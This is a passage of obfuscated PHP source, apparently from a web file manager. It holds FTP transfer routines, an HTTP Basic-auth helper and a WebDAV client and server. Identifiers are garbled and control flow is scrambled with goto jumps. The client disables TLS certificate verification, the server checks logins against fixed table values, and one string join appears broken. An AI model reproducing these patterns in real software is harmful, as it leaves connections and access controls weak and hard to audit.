$fæØèŠá°ì) { $fÔ‘ê»¹š[] = array($f³Ğ¤Ö·ñ[75] => $f³Ğ¤Ö·ñ[8] . trim(str_replace($bÌï’â±àÆ, $f³Ğ¤Ö·ñ[33], $fæØèŠá°ì), $f³Ğ¤Ö·ñ[8]) . $f³Ğ¤Ö·ñ[8], $f³Ğ¤Ö·ñ[76] => 1, $f³Ğ¤Ö·ñ[77] => 0); } foreach ($d™¹à›¾‹Ã[$f³Ğ¤Ö·ñ[73]] as $dÓó“”á²§) { $fÔ‘ê»¹š[] = array($f³Ğ¤Ö·ñ[75] => $f³Ğ¤Ö·ñ[8] . trim(str_replace($bÌï’â±àÆ, $f³Ğ¤Ö·ñ[33], $dÓó“”á²§), $f³Ğ¤Ö·ñ[8]), $f³Ğ¤Ö·ñ[76] => 0, $f³Ğ¤Ö·ñ[77] => $this->size($dÓó“”á²§)); } return $fÔ‘ê»¹š; goto EÊ–Ü»¯§Ğ; AŠ·•‰‚„œ: $d™¹à›¾‹Ã = array($f³Ğ¤Ö·ñ[73] => array(), $f³Ğ¤Ö·ñ[74] => array()); $this->recursionFtpFiles($bÌï’â±àÆ, $d™¹à›¾‹Ã); $fÔ‘ê»¹š = array(); goto EŸ¥ÌëøÓ„; Bôï°Ô†¶®: $f³Ğ¤Ö·ñ =& $_SERVER[£ü]; if (!$this->_isconn()) { return !1; } $bÌï’â±àÆ = $this->iconvSystem($bÌï’â±àÆ); goto AŠ·•‰‚„œ; EÊ–Ü»¯§Ğ: } public function getContent($aøé£‡¢¯·) { if (!$this->_isconn()) { return !1; } $aøé£‡¢¯· = $this->iconvSystem($aøé£‡¢¯·); return $this->fileSubstr($aøé£‡¢¯·); } public function setContent($D ñ‹Şæ›, $eÑ½šª®Êó = '') { goto b›Îé¤Ò‚‚; D°é×˜Ã¥ö: return $EˆË¤‰; goto dÙ¦ËÆˆ…ª; FÃÆ±Ë«Œ: file_put_contents($A¾éòˆµ, $eÑ½šª®Êó); $EˆË¤‰ = $this->upload($D ñ‹Şæ›, $this->iconvApp($A¾éòˆµ)); $this->tempFileRemve($A¾éòˆµ); goto D°é×˜Ã¥ö; b›Îé¤Ò‚‚: if (!$this->_isconn()) { return !1; } $CºÊ¿â‘â³ = $this->pathThis($this->iconvSystem($D ñ‹Şæ›)); $A¾éòˆµ = $this->tempFile($CºÊ¿â‘â³); goto FÃÆ±Ë«Œ; dÙ¦ËÆˆ…ª: } public function fileSubstr($Bßñõ¬¨È, $aÄ¢‡‡ÌŒ = 0, $a‘¿âè²ŒÎ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($Bßñõ¬¨È, $aÄ¢‡‡ÌŒ, $a‘¿âè²ŒÎ); } private function ftpRequest($FùÁ¬šñçà, $a…óŸ±­ÌÓ = 0, $f»˜ññœ“Ü = false) { goto bˆ”±‹‘; d‰åŸÀôª–: curl_setopt($BÕ¦°éäÍº, CURLOPT_RETURNTRANSFER, 1); $eùÁõØ„Ä° = curl_exec($BÕ¦°éäÍº); curl_close($BÕ¦°éäÍº); goto aåòŒ¢—™È; bˆ”±‹‘: $FùÁ¬šñçà = $this->iconvSystem($FùÁ¬šñçà); $Eæ×»”°ô = $this->scheme . $this->host . $_SERVER[£ü][4] . $this->port; $BÕ¦°éäÍº = curl_init(); goto cÔíÀã–é; aåòŒ¢—™È: return $eùÁõØ„Ä°; goto c•Î…¹†ù¤; cÔíÀã–é: curl_setopt($BÕ¦°éäÍº, CURLOPT_URL, $Eæ×»”°ô . $this->pathEncode($FùÁ¬šñçà)); curl_setopt($BÕ¦°éäÍº, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($f»˜ññœ“Ü) { $f²ˆğÚŒ¬› = $a…óŸ±­ÌÓ + $f»˜ññœ“Ü - 1; curl_setopt($BÕ¦°éäÍº, CURLOPT_RANGE, "{$a…óŸ±­ÌÓ}\x2d{$f²ˆğÚŒ¬›}"); } goto d‰åŸÀôª–; c•Î…¹†ù¤: } public function upload($C °á§¨¡´, $D»ÅµÛé•, $bÏ™©ÁÃ÷´ = false, $c® ÁÌõ®† = REPEAT_REPLACE) { goto b‰¼Ô¡›õŠ; b‰¼Ô¡›õŠ: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($C °á§¨¡´))) { return !1; } $C °á§¨¡´ = $this->iconvSystem($C °á§¨¡´); goto a™ÏòœÅÃÅ; a™ÏòœÅÃÅ: $D»ÅµÛé• = $this->iconvSystem($D»ÅµÛé•); $Aˆíï’¬à‡ = ftp_nb_put($this->connect, $C °á§¨¡´, $D»ÅµÛé•, FTP_BINARY); while ($Aˆíï’¬à‡ == FTP_MOREDATA) { $Aˆíï’¬à‡ = ftp_nb_continue($this->connect); } goto bæÊÉºä˜˜; bæÊÉºä˜˜: if ($Aˆíï’¬à‡ != FTP_FINISHED) { return !1; } return $this->getPathOuter($C °á§¨¡´); goto D˜¦í×ïÎÄ; D˜¦í×ïÎÄ: } public function download($bˆƒ­Ò®Û¦, $CÜÓßó¿° = '') { goto ağŒÓÛ…£Ã; B±›İ³Œö„: while ($FŒÓÂõ•Ûš == FTP_MOREDATA) { $FŒÓÂõ•Ûš = ftp_nb_continue($this->connect); } if ($FŒÓÂõ•Ûš != FTP_FINISHED) { return !1; } return $this->iconvApp($CÜÓßó¿°); goto e„¸ßíù‹; ağŒÓÛ…£Ã: if (!$this->_isconn()) { return !1; } $C‹–§¢¿² = $this->pathFather($CÜÓßó¿°); if (!IO::mkdir($C‹–§¢¿²)) { return !1; } goto fÅÜÍÊåÑÒ; fÅÜÍÊåÑÒ: $bˆƒ­Ò®Û¦ = $this->iconvSystem($bˆƒ­Ò®Û¦); $CÜÓßó¿° = $this->iconvSystem($CÜÓßó¿°); $FŒÓÂõ•Ûš = ftp_nb_get($this->connect, $CÜÓßó¿°, $bˆƒ­Ò®Û¦, FTP_BINARY); goto B±›İ³Œö„; e„¸ßíù‹: } private function ftpList($b¨³ŠëØãœ) { goto EÓˆ˜‰…„; Añ« ÒªÀÈ: $f¼åŒ èï = array(); foreach ($bÍ¯šáàÄ as $c÷ÈÒâª’Œ) { if ($c÷ÈÒâª’Œ == $a¬‡ÉÊ†åî[93] || $c÷ÈÒâª’Œ == $a¬‡ÉÊ†åî[1147]) { continue; } if (!strstr($c÷ÈÒâª’Œ, $a¬‡ÉÊ†åî[8])) { $c÷ÈÒâª’Œ = $b¨³ŠëØãœ . ltrim($c÷ÈÒâª’Œ, $a¬‡ÉÊ†åî[8]); } $f¼åŒ èï[] = $this->iconvApp($c÷ÈÒâª’Œ); } return $f¼åŒ èï; goto EŠéŸá“èÔ; EÓˆ˜‰…„: $a¬‡ÉÊ†åî =& $_SERVER[£ü]; if (!$this->isFolder($b¨³ŠëØãœ)) { return !1; } @ftp_chdir($this->connect, $a¬‡ÉÊ†åî[8]); goto d‘«é™’; d‘«é™’: $b¨³ŠëØãœ = rtrim($b¨³ŠëØãœ, $a¬‡ÉÊ†åî[8]) . $a¬‡ÉÊ†åî[8]; $bÍ¯šáàÄ = @ftp_nlist($this->connect, $b¨³ŠëØãœ); if ($bÍ¯šáàÄ === !1) { $bÍ¯šáàÄ = @ftp_rawlist($this->connect, $b¨³ŠëØãœ); foreach ($bÍ¯šáàÄ as $cÄ‘º®ìÆÄ => $dèŠåÉéèï) { $bÍ¯šáàÄ[$cÄ‘º®ìÆÄ] = end(explode($a¬‡ÉÊ†åî[1146], $dèŠåÉéèï)); } } goto Añ« ÒªÀÈ; EŠéŸá“èÔ: } private function recursionFtpFiles($bŠöÕá¨, &$f¿¨ù‡µĞ…) { $FÚÁ¾äêİ =& $_SERVER[£ü]; if (!$this->_isconn()) { return !1; } if (!($C‹ìåÅÒ„– = $this->ftpList($bŠöÕá¨))) { return !1; } foreach ($C‹ìåÅÒ„– as $bŠöÕá¨) { if ($this->isFolder($bŠöÕá¨)) { $this->recursionFtpFiles($bŠöÕá¨, $f¿¨ù‡µĞ…); $f¿¨ù‡µĞ…[$FÚÁ¾äêİ[74]][] = $bŠöÕá¨; } else { $f¿¨ù‡µĞ…[$FÚÁ¾äêİ[73]][] = $bŠöÕá¨; } } } private function objectMeta($F‹º®‘Õ—) { goto E“¤àÀÍÔº; Aî•ˆŠ‹ï: if ($Dù¢´öè³‚ !== null && $Dù¢´öè³‚ !== !1) { return $Dù¢´öè³‚; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $AŸ˜ˆ‚Üñ²[8]); goto Eºµ‹ ‰ª…; E“¤àÀÍÔº: $AŸ˜ˆ‚Üñ² =& $_SERVER[£ü]; $d°ø¥Š·§÷ = $AŸ˜ˆ‚Üñ²[1148] . md5($F‹º®‘Õ—); $Dù¢´öè³‚ = Cache::get($d°ø¥Š·§÷); goto Aî•ˆŠ‹ï; E§šáèµ‡È: return $Dù¢´öè³‚; goto b·”ßÖÖ¯è; Eºµ‹ ‰ª…: $C‹’âÁŒ‚ = @ftp_size($this->connect, $this->iconvSystem($F‹º®‘Õ—)); if ($C‹’âÁŒ‚ != -1) { $Dù¢´öè³‚ = array($AŸ˜ˆ‚Üñ²[77] => $C‹’âÁŒ‚, $AŸ˜ˆ‚Üñ²[29] => $AŸ˜ˆ‚Üñ²[164]); } else { $eõ¤…ßˆ¤ = @ftp_chdir($this->connect, $this->iconvSystem($F‹º®‘Õ—)); $Dù¢´öè³‚ = $eõ¤…ßˆ¤ ? array($AŸ˜ˆ‚Üñ²[77] => 0, $AŸ˜ˆ‚Üñ²[29] => $AŸ˜ˆ‚Üñ²[76]) : !1; } Cache::set($d°ø¥Š·§÷, $Dù¢´öè³‚, 0); goto E§šáèµ‡È; b·”ßÖÖ¯è: } } goto BäŠ–»êŸ; cğÉ­»Çîß: class HttpAuth { public static function get() { $e¯®Ñ»¯Õò =& $_SERVER[£ü]; $F…÷¢—¬šß = $e¯®Ñ»¯Õò[33]; $còè·†¿¸î = $e¯®Ñ»¯Õò[33]; if (isset($_SERVER[$e¯®Ñ»¯Õò[1720]])) { $F…÷¢—¬šß = $_SERVER[$e¯®Ñ»¯Õò[1720]]; $còè·†¿¸î = $_SERVER[$e¯®Ñ»¯Õò[1721]]; } elseif (isset($_SERVER[$e¯®Ñ»¯Õò[1722]])) { $CÂÕ¯áÅÓó = $_SERVER[$e¯®Ñ»¯Õò[1722]]; if (strpos(strtolower($CÂÕ¯áÅÓó), $e¯®Ñ»¯Õò[1723]) === 0) { $bèôë›¯İ† = explode($e¯®Ñ»¯Õò[4], base64_decode(substr($CÂÕ¯áÅÓó, 6))); $F…÷¢—¬šß = isset($bèôë›¯İ†[0]) ? $bèôë›¯İ†[0] : $e¯®Ñ»¯Õò[33]; $còè·†¿¸î = isset($bèôë›¯İ†[1]) ? $bèôë›¯İ†[1] : 0; } } return array($e¯®Ñ»¯Õò[531] => $F…÷¢—¬šß, $e¯®Ñ»¯Õò[887] => $còè·†¿¸î); } public static function error() { goto Dš°À„…‘î; b•Œ§ßßÚÄ: header($E±Òšù§İ[1726]); header($E±Òšù§İ[1727]); header($E±Òšù§İ[1245]); goto aºº‘ó†Ëí; Dš°À„…‘î: $E±Òšù§İ =& $_SERVER[£ü]; header($E±Òšù§İ[1724]); header($E±Òšù§İ[1725]); goto b•Œ§ßßÚÄ; aºº‘ó†Ëí: die; goto bŠáõ†ŞéÚ; bŠáõ†ŞéÚ: } public static function make($d¥öİ¥Üˆ¦, $aÊÏğœàà›) { $bÓéŒª¦ =& $_SERVER[£ü]; return $bÓéŒª¦[1728] + base64_encode($d¥öİ¥Üˆ¦ . $bÓéŒª¦[4] . $aÊÏğœàà›); } } class HttpDavClient { public function __construct($E·õò¬‚Åœ, $C¸¥‰åÓÌğ, $C¾äìà¥¡Ä) { $this->header = array(); $this->userName = $C¸¥‰åÓÌğ; $this->userPassowrd = $C¾äìà¥¡Ä; } protected function makePath($F‘¾ŒÅ´ò) { return $F‘¾ŒÅ´ò; } protected function setHeader($aŒƒ‡„Ê„•, $fµŒåİŒ ã = false) { if ($fµŒåİŒ ã === !1) { $this->header[] = $aŒƒ‡„Ê„•; } else { $this->header[] = $aŒƒ‡„Ê„• . $_SERVER[£ü][870] . $fµŒåİŒ ã; } } public function move($Fš‰¹¢ÃÖ, $eÛ–ÑØ¨ÓÕ, $B‚…¢šÈó• = '') { $Aáê¶Èê…ƒ =& $_SERVER[£ü]; $this->setHeader($Aáê¶Èê…ƒ[1729], $this->makePath($eÛ–ÑØ¨ÓÕ)); $this->setHeader($Aáê¶Èê…ƒ[1730], $Aáê¶Èê…ƒ[1731]); if ($B‚…¢šÈó•) { $this->setHeader($Aáê¶Èê…ƒ[1732], $Aáê¶Èê…ƒ[915] . $B‚…¢šÈó• . $Aáê¶Èê…ƒ[918]); } return $this->send($Aáê¶Èê…ƒ[1733], $Fš‰¹¢ÃÖ); } public function copy($Aİ¥¼…Ì¿“, $b—ƒŒ“¢‘ë) { $fñ±Ú İİ =& $_SERVER[£ü]; $this->setHeader($fñ±Ú İİ[1729], $this->makePath($b—ƒŒ“¢‘ë)); $this->setHeader($fñ±Ú İİ[1730], $fñ±Ú İİ[1731]); return $this->send($fñ±Ú İİ[1734], $Aİ¥¼…Ì¿“); } public function mkcol($aòİ“Ã£„) { $FŒ¸·ìŞğ =& $_SERVER[£ü]; $this->setHeader($FŒ¸·ìŞğ[1730], $FŒ¸·ìŞğ[1731]); return $this->send($FŒ¸·ìŞğ[1735], $aòİ“Ã£„); } public function delete($e›µƒÊˆŒë, $C“ÑŞÉÇ³¾ = '') { $eã¿è ‘Í =& $_SERVER[£ü]; if ($C“ÑŞÉÇ³¾) { $this->setHeader($eã¿è ‘Í[1732], $eã¿è ‘Í[915] . $C“ÑŞÉÇ³¾ . $eã¿è ‘Í[918]); } return $this->send($eã¿è ‘Í[1233], $e›µƒÊˆŒë); } public function propfind($dÒµ¸æÁÙğ) { $bõÂ‹Ç¢®ï =& $_SERVER[£ü]; $this->setHeader($bõÂ‹Ç¢®ï[1736], $bõÂ‹Ç¢®ï[83]); $this->setHeader($bõÂ‹Ç¢®ï[1737], $bõÂ‹Ç¢®ï[1738]); $EªÉ«Ú® = $bõÂ‹Ç¢®ï[1739]; return $this->send($bõÂ‹Ç¢®ï[1740], $dÒµ¸æÁÙğ, $EªÉ«Ú®); } public function options($cåÜ§ÜÜîÚ) { return $this->send($_SERVER[£ü][1741], $cåÜ§ÜÜîÚ); } public function get($däÑš¸±Ÿñ) { return $this->send($_SERVER[£ü][213], $däÑš¸±Ÿñ); } public function put($C´‡±Šã¹Á, $CÏî®×£‚°, $c¸ù©¹±¶ = '') { $fÕ‚¡İÖ· =& $_SERVER[£ü]; if ($c¸ù©¹±¶) { $this->setHeader($fÕ‚¡İÖ·[1732], $fÕ‚¡İÖ·[915] . $c¸ù©¹±¶ . $fÕ‚¡İÖ·[918]); } return $this->send($fÕ‚¡İÖ·[211], $C´‡±Šã¹Á, $CÏî®×£‚°); } protected function send($A­êÓ†ñôÂ, $EåÀÓëø„, $c­µªîµŒŞ = false, $d îšÀï = false) { goto F¹–†ß£¾â; F¹–†ß£¾â: $B¸®ƒŞ´ =& $_SERVER[£ü]; $c‹×±Ü­ = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($B¸®ƒŞ´[1742], $B¸®ƒŞ´[50]); goto dÇ¶â¡«¨Ã; Fâ·´ª£: curl_setopt($bôšóØŞ´¼, CURLOPT_HTTPHEADER, $this->header); curl_setopt($bôšóØŞ´¼, CURLOPT_RETURNTRANSFER, !0); curl_setopt($bôšóØŞ´¼, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto F®à³‘àâõ; c‡éã½ : $this->header = array(); return $D×¸õò‘¡‘; goto dËô±ÎÈ‚Ò; F®à³‘àâõ: curl_setopt($bôšóØŞ´¼, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($bôšóØŞ´¼, CURLOPT_SSL_VERIFYHOST, !1); $D×¸õò‘¡‘ = curl_exec($bôšóØŞ´¼); goto c‡éã½ ; dÇ¶â¡«¨Ã: $this->setHeader($c‹×±Ü­); if ($c­µªîµŒŞ) { $c­µªîµŒŞ = $B¸®ƒŞ´[1743] . $c­µªîµŒŞ; } if (!request_url_safe($EåÀÓëø„)) { return !1; } goto d™Ø˜ÄõÑã; d™Ø˜ÄõÑã: $bôšóØŞ´¼ = curl_init($EåÀÓëø„); curl_setopt($bôšóØŞ´¼, CURLOPT_CUSTOMREQUEST, $A­êÓ†ñôÂ); curl_setopt($bôšóØŞ´¼, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto Fâ·´ª£; dËô±ÎÈ‚Ò: } } class HttpDavServer { public function __construct($DÇÚ«Ü×Ğ, $FäÊ–º¤±§) { $this->root = $DÇÚ«Ü×Ğ; $this->initPath($FäÊ–º¤±§); $this->start(); } public function initPath($Eñƒõ¤õ‘×) { $Dƒ¨š¨¹¢ =& $_SERVER[£ü]; $EÎ‡¥Şê¿Œ = rtrim($_SERVER[$Dƒ¨š¨¹¢[1352]], $Dƒ¨š¨¹¢[8]) . $Dƒ¨š¨¹¢[8]; $this->urlBase = substr($EÎ‡¥Şê¿Œ, 0, strpos($EÎ‡¥Şê¿Œ, $Eñƒõ¤õ‘×) + 1); $this->urlBase = rtrim($this->urlBase, $Dƒ¨š¨¹¢[8]) . $Eñƒõ¤õ‘×; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $bÚ°ò“Â—š =& $_SERVER[£ü]; $E”ªÉ¶‡Ç = HttpAuth::get(); if ($E”ªÉ¶‡Ç[$bÚ°ò“Â—š[531]] == $bÚ°ò“Â—š[1744] && $E”ªÉ¶‡Ç[$bÚ°ò“Â—š[887]] == $bÚ°ò“Â—š[1745]) { return !0; } HttpAuth::error(); } public function start() { goto e²ƒÂÁÀá; BÑ»¢ƒ«Œ: if (!$Aç§¹œ½½) { return; } self::response($Aç§¹œ½½); goto d‰ğ‚”í¶; e²ƒÂÁÀá: $FÌª§ä™’ =& $_SERVER[£ü]; $this->checkUser(); $A­Ãêí¶‘é = $FÌª§ä™’[143] . HttpHeader::method(); goto B¨Ş‰ÉÛ›­; B¨Ş‰ÉÛ›­: if (!method_exists($this, $A­Ãêí¶‘é)) { pr($A­Ãêí¶‘é . $FÌª§ä™’[1746]); die; } $f¥¸í™†‘ = array($FÌª§ä™’[1747], $FÌª§ä™’[1748]); if (!in_array($A­Ãêí¶‘é, $f¥¸í™†‘) && !$this->pathExists($this->path)) { $Aç§¹œ½½ = array($FÌª§ä™’[1022] => 404); } else { $Aç§¹œ½½ = $this->{$A­Ãêí¶‘é}(); } goto BÑ»¢ƒ«Œ; d‰ğ‚”í¶: } public function pathGet($E¨ßªƒğ¡è = false) { $aì³„œÖÖè =& $_SERVER[£ü]; $F¤‚³ïæÙ = $E¨ßªƒğ¡è ? $_SERVER[$aì³„œÖÖè[1749]] : $_SERVER[$aì³„œÖÖè[1352]]; $F¤‚³ïæÙ = KodIO::clear(rawurldecode($F¤‚³ïæÙ)); if (!strstr($F¤‚³ïæÙ, KodIO::clear($this->urlBase))) { return !1; } return substr($F¤‚³ïæÙ, strpos($F¤‚³ïæÙ, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($a‘õ½°ñ‹) { return file_exists($a‘õ½°ñ‹); } public function pathMkdir($cİ†ß¤í) { return mkdir($cİ†ß¤í, 511, !0); } public function pathInfo($Aºè——äÖÍ) { return path_info($Aºè——äÖÍ); } public function pathList($eµ¼²ƒÌÅ) { return path_list($eµ¼²ƒÌÅ); } public function pathOut($dÛ§¤á–”¢) { echo file_get_contents($dÛ§¤á–”¢); } public function pathPut($dÌ…¿ò¨­¾, $Aâ—½ÂÆùö = '') { if (!$Aâ—½ÂÆùö) { return file_put_contents($dÌ…¿ò¨­¾, $_SERVER[£ü][33]); } return move_path($Aâ—½ÂÆùö, $dÌ…¿ò¨­¾); } public function pathRemove($B£¤ËÏ˜õø) { if (is_file($B£¤ËÏ˜õø)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($Eò°õ´Áï¨, $d—Ø–´) { return move_path($Eò°õ´Áï¨, $d—Ø–´); } public function pathCopy($Aƒ‰¯àíœ, $FİÊ³½Â¡Á) { return copy_dir($Aƒ‰¯àíœ, $FİÊ³½Â¡Á); } public function parsePath($e¥íöíÑ¨á) { return $e¥íöíÑ¨á; } public function parseItem($Dà£Ş±¨å, $BÚâŒ·ÉŸ¨) { goto F¨áŠã’Ë ; A‰œ…ÛŠÜå: $dïñ‹‡Îâ = array($f‡˜âğ‰ª[1750] => KodIO::clear($this->urlBase . $cŠ¾…‰Ó), $f‡˜âğ‰ª[107] => @gmdate($f‡˜âğ‰ª[1751], $Dà£Ş±¨å[$f‡˜âğ‰ª[107]]), $f‡˜âğ‰ª[184] => @gmdate($f‡˜âğ‰ª[1752], $Dà£Ş±¨å[$f‡˜âğ‰ª[184]]), $f‡˜âğ‰ª[77] => $Dà£Ş±¨å[$f‡˜âğ‰ª[77]] ? $Dà£Ş±¨å[$f‡˜âğ‰ª[77]] : 0); return $dïñ‹‡Îâ; goto d–íçÜ×¶•; F¨áŠã’Ë : $f‡˜âğ‰ª =& $_SERVER[£ü]; $cŠ¾…‰Ó = $this->pathGet() . $f‡˜âğ‰ª[8] . $Dà£Ş±¨å[$f‡˜âğ‰ª[28]]; $cŠ¾…‰Ó = $f‡˜âğ‰ª[8] . str_replace($f‡˜âğ‰ª[169], $f‡˜âğ‰ª[8], rawurlencode($cŠ¾…‰Ó)); goto BÚ´˜¬œ«; BÚ´˜¬œ«: if ($BÚâŒ·ÉŸ¨) { $cŠ¾…‰Ó = $f‡˜âğ‰ª[8] . str_replace($f‡˜âğ‰ª[169], $f‡˜âğ‰ª[8], rawurlencode($this->pathGet())); } if (!trim($Dà£Ş±¨å[$f‡˜âğ‰ª[107]])) { $Dà£Ş±¨å[$f‡˜âğ‰ª[107]] = time(); } if (!trim($Dà£Ş±¨å[$f‡˜âğ‰ª[184]])) { $Dà£Ş±¨å[$f‡˜âğ‰ª[184]] = time(); } goto A‰œ…ÛŠÜå; d–íçÜ×¶•: } public function parseItemXml($fŠíèÎäš…, $F…÷É¹Â™‘) { $dƒ¹‡°µ«Ş =& $_SERVER[£ü]; $e±¶Š­¡ = $this->parseItem($fŠíèÎäš…, $F…÷É¹Â™‘); if ($fŠíèÎäš…[$dƒ¹‡°µ«Ş[29]] == $dƒ¹‡°µ«Ş[76]) { $CÎÌê»‚Ê„ = $dƒ¹‡°µ«Ş[1753]; $CÎÌê»‚Ê„ .= $dƒ¹‡°µ«Ş[1754]; } else { $FÆ×‚šáŠ = $fŠíèÎäš…[$dƒ¹‡°µ«Ş[157]] ? $fŠíèÎäš…[$dƒ¹‡°µ«Ş[157]] : get_path_ext($fŠíèÎäš…[$dƒ¹‡°µ«Ş[28]]); $B±¢©Ö‡¿ñ = get_file_mime($FÆ×‚šáŠ); $CÎÌê»‚Ê„ = $dƒ¹‡°µ«Ş[1755]; $CÎÌê»‚Ê„ .= "\x3c\x44\72\147\x65\164\x63\157\156\164\145\156\x74\x74\x79\160\145\x3e{$B±¢©Ö‡¿ñ}\74\x2f\104\x3a\147\145\164\143\157\x6e\x74\145\x6e\164\164\171\160\145\x3e"; } return "\12\11\x9\74\x44\x3a\162\x65\163\x70\x6f\156\163\145\76\12\11\11\11\74\x44\72\150\x72\x65\x66\76{$e±¶Š­¡[$dƒ¹‡°µ«Ş[1750]]}\74\57\104\x3a\150\162\x65\x66\x3e\12\x9\x9\11\74\104\72\160\x72\157\x70\163\164\x61\164\x3e\xa\11\11\11\11\x3c\104\x3a\160\162\157\160\x3e\xa\11\11\x9\11\x9\74\104\72\x67\145\164\154\141\163\x74\x6d\x6f\144\x69\x66\151\145\x64\76{$e±¶Š­¡[$dƒ¹‡°µ«Ş[107]]}\74\x2f\x44\x3a\x67\145\x74\154\x61\163\x74\x6d\157\x64\x69\146\151\145\144\76\xa\x9\11\11\x9\11\74\x44\x3a\x63\x72\x65\141\164\x69\x6f\156\x64\x61\x74\145\76{$e±¶Š­¡[$dƒ¹‡°µ«Ş[184]]}\74\57\x44\x3a\x63\162\x65\x61\164\151\x6f\x6e\x64\x61\x74\x65\76\xa\11\11\11\11\11\74\104\x3a\147\145\x74\143\157\156\164\x65\x6e\x74\x6c\x65\156\x67\x74\150\x3e{$e±¶Š­¡[$dƒ¹‡°µ«Ş[77]]}\74\57\x44\72\x67\x65\x74\143\x6f\156\164\145\156\x74\154\145\x6e\147\x74\x68\76\xa\11\11\11\x9\11{$CÎÌê»‚Ê„}\12\x9\x9\x9\11\74\x2f\104\72\x70\162\x6f\x70\76\xa\x9\11\x9\11\x3c\x44\72\x73\164\141\164\165\163\76\x48\124\124\120\x2f\x31\56\61\40\x32\60\x30\x20\117\113\74\x2f\x44\x3a\x73\164\x61\x74\165\163\76\xa\11\x9\11\74\57\x44\72\160\162\x6f\160\x73\x74\x61\164\x3e\xa\11\x9\74\x2f\104\x3a\x72\x65\163\160\157\156\x73\x65\76"; } public function pathListMerge($CêÉ¼ô¬İ±) { goto d¡ÍÊŠÚÜÌ; d¡ÍÊŠÚÜÌ: $eğ‘ö…¦– =& $_SERVER[£ü]; if (!$CêÉ¼ô¬İ±) { return $CêÉ¼ô¬İ±; } $aŸ´Äñé®á = array($eğ‘ö…¦–[73], $eğ‘ö…¦–[74], $eğ‘ö…¦–[1756]); goto Dµ´ô½¾§; c±—¿‹Ò: return $BÈ“Ÿ©æ´ã; goto FïÄäÇÚè; Dµ´ô½¾§: $BÈ“Ÿ©æ´ã = array(); foreach ($CêÉ¼ô¬İ± as $Eˆ¯ù”‡Ê¡ => $AĞ‹×Ü ˆ) { if (!in_array($Eˆ¯ù”‡Ê¡, $aŸ´Äñé®á) || !is_array($AĞ‹×Ü ˆ)) { continue; } $BÈ“Ÿ©æ´ã = array_merge($BÈ“Ÿ©æ´ã, $AĞ‹×Ü ˆ); } foreach ($BÈ“Ÿ©æ´ã as &$fƒ»ÛÍë™¹) { $fƒ»ÛÍë™¹[$eğ‘ö…¦–[28]] = str_replace($eğ‘ö…¦–[8], $eğ‘ö…¦–[1354], $fƒ»ÛÍë™¹[$eğ‘ö…¦–[28]]); } goto c±—¿‹Ò; FïÄäÇÚè: } public function httpPROPFIND() { goto aÅ­æØ´»²; a×á×²«¿ó: $DïíÏ²ëôĞ = $Eœåâ³ÔŸÎ[$cÂ¨¢Ÿœˆ[1757]]; if (!is_array($Eâ’å¯»Û…) || $DïíÏ²ëôĞ[$cÂ¨¢Ÿœˆ[1758]] === !1) { return array($cÂ¨¢Ÿœˆ[1759] => 404, $cÂ¨¢Ÿœˆ[1760] => $cÂ¨¢Ÿœˆ[1761]); } $eŠöÚÖŠ = $DïíÏ²ëôĞ[$cÂ¨¢Ÿœˆ[29]] == $cÂ¨¢Ÿœˆ[164] || HttpHeader::get($cÂ¨¢Ÿœˆ[1736]) == $cÂ¨¢Ÿœˆ[464]; goto F“Ïøø³å; F“Ïøø³å: if ($eŠöÚÖŠ) { $Eâ’å¯»Û… = array($DïíÏ²ëôĞ); } else { $DïíÏ²ëôĞ[$cÂ¨¢Ÿœˆ[28]] = $cÂ¨¢Ÿœˆ[33]; $Eâ’å¯»Û… = array_merge(array($DïíÏ²ëôĞ), $Eâ’å¯»Û…); } $A´³ÚÅ¿¶ = $cÂ¨¢Ÿœˆ[33]; foreach ($Eâ’å¯»Û… as $f’Å–ì»¶Æ) { $A´³ÚÅ¿¶ .= $this->parseItemXml($f’Å–ì»¶Æ, $eŠöÚÖŠ); } goto F¤³ˆ¦Šô; F¤³ˆ¦Šô: return array($cÂ¨¢Ÿœˆ[1759] => 207, $cÂ¨¢Ÿœˆ[1760] => "\74\104\x3a\155\165\154\164\151\x73\164\x61\x74\165\163\40\x78\x6d\x6c\156\x73\72\104\x3d\42\104\101\x56\72\42\x3e\xa{$A´³ÚÅ¿¶}\12\74\x2f\104\72\x6d\165\x6c\x74\x69\163\x74\141\164\165\163\x3e"); goto B·ô•›©Â; aÅ­æØ´»²: $cÂ¨¢Ÿœˆ =& $_SERVER[£ü]; $Eœåâ³ÔŸÎ = $this->pathList($this->path); $Eâ’å¯»Û… = $this->pathListMerge($Eœåâ³ÔŸÎ); goto a×á×²«¿ó; B·ô•›©Â: } public function httpHEAD() { $bÕêÜ×†‚ =& $_SERVER[£ü]; $A¦Ò¯Î¾È = $this->pathInfo($this->path); if (!$A¦Ò¯Î¾È || $A¦Ò¯Î¾È[$bÕêÜ×†‚[29]] == $bÕêÜ×†‚[76]) { return array($bÕêÜ×†‚[1022] => 200, $bÕêÜ×†‚[1189] => array($bÕêÜ×†‚[1762])); } return array($bÕêÜ×†‚[1022] => 200, $bÕêÜ×†‚[1189] => array($bÕêÜ×†‚[1763], $bÕêÜ×†‚[136], $bÕêÜ×†‚[1764] . $A¦Ò¯Î¾È[$bÕêÜ×†‚[77]], $bÕêÜ×†‚[1765] . get_file_mime($A¦Ò¯Î¾È[$bÕêÜ×†‚[157]]), $bÕêÜ×†‚[132] . gmdate($bÕêÜ×†‚[1751], $A¦Ò¯Î¾È[$bÕêÜ×†‚[1236]]) . $bÕêÜ×†‚[1766], $bÕêÜ×†‚[1767])); } public function httpOPTIONS() { $E‚÷™ä”Ê— =& $_SERVER[£ü]; return array($E‚÷™ä”Ê—[1022] => 200, $E‚÷™ä”Ê—[1189] => array($E‚÷™ä”Ê—[1768], $E‚÷™ä”Ê—[1769], $E‚÷™ä”Ê—[1770], $E‚÷™ä”Ê—[1245])); } public function httpPROPPATCH() { $b¤Ğ”ºí™ =& $_SERVER[£ü]; $a‚¥Úä‰ì = $b¤Ğ”ºí™[1771] . 